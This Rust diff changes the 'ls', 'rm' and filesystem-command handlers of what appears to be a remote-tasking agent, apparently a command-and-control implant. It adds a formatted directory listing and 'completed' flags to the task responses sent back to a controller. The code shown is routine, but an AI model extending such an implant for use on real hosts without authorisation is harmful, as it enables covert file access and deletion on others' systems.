@@ -71,6 +71,7 @@ fn handle_ls(task: &serde_json::Value, parsed_params: &serde_json::Value) -> Res
                         "files": []
                     },
                     "user_output": format!("Failed to list {}: {}", abs_str, e),
+                    "completed": true,
                     "status": "error"
                 }]
             });
@@ -78,6 +79,20 @@ fn handle_ls(task: &serde_json::Value, parsed_params: &serde_json::Value) -> Res
             return Ok(());
         }
     }
+
+    // Build text listing for user_output
+    let mut listing = format!("Listing: {}\n\n", abs_str);
+    for f in &file_entries {
+        let name = f.get("name").and_then(|v| v.as_str()).unwrap_or("?");
+        let is_file = f.get("is_file").and_then(|v| v.as_bool()).unwrap_or(false);
+        let size = f.get("size").and_then(|v| v.as_u64()).unwrap_or(0);
+        if is_file {
+            listing.push_str(&format!("  {:>10}  {}\n", size, name));
+        } else {
+            listing.push_str(&format!("  {:>10}  {}/\n", "<DIR>", name));
+        }
+    }
+    listing.push_str(&format!("\n{} entries", file_entries.len()));
 
     let resp = serde_json::json!({
         "action": "post_response",
@@ -92,7 +107,8 @@ fn handle_ls(task: &serde_json::Value, parsed_params: &serde_json::Value) -> Res
                 "update_deleted": true,
                 "files": file_entries
             },
-            "user_output": format!("Listed {} entries in {}", file_entries.len(), abs_str),
+            "user_output": listing,
+            "completed": true,
             "status": "success"
         }]
     });
@@ -143,6 +159,7 @@ fn handle_rm(task: &serde_json::Value, parsed_params: &serde_json::Value) -> Res
         "responses": [{
             "task_id": id,
             "user_output": output,
+            "completed": true,
             "status": status,
             "removed_files": removed
         }]
@@ -229,7 +246,7 @@ pub fn handle_fs_command(task: &serde_json::Value) -> Result<(), Box<dyn std::er
             {
                 "task_id": task.get("id").unwrap().as_str().unwrap(),
                 "user_output": output,
-                "timestamp": task.get("timestamp").unwrap().as_f64().unwrap(),
+                "completed": true,
                 "status": "success",
             }
         ]
